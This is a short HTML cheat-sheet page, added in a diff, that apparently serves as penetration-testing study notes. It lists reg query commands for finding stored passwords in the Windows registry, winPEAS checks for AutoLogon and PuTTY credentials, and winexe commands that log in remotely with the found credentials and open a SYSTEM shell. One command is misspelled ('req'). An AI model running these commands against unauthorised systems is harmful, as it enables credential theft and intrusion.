@@ -1,0 +1,38 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>password - Registry</title>
+</head><body><br/>
+Search the Registry for Passwords<br/>
+<br/>
+the following commands will search the registry for keys and values that contain "password"<br/>
+<br/>
+<i>reg query HKLM /f password /t REG_SZ /s<br/>
+<br/>
+reg query HKCU /f password /t REG_SZ /s<br/>
+<br/>
+</i>This usually genrates a lot of results, so often it is more fruitful to look in known locations<br/>
+<br/>
+<br/>
+<b>Identification</b><br/>
+<br/>
+.\winPEASany.exe quiet filesinfo userinfo<br/>
+<br/>
+search: <b>Looking for AutoLogon credentials<br/>
+</b><b>or<br/>
+<br/>
+</b>search: <b>Putty Sessions()<br/>
+</b><b><br/>
+<br/>
+</b><b>manual</b><br/>
+<br/>
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"<br/>
+<br/>
+req query "HKCU\Software\&lt;username&gt;\PuTTY\Sessions" /s<br/>
+<br/>
+<br/>
+<b>login to windows machine</b><br/>
+<br/>
+winexe -U '&lt;username&gt;%&lt;password&gt;' //&lt;ip address&gt; cmd.exe<br/>
+winexe -U '&lt;username&gt;%&lt;password&gt;' --system //&lt;ip address&gt; cmd.exe</body></html>
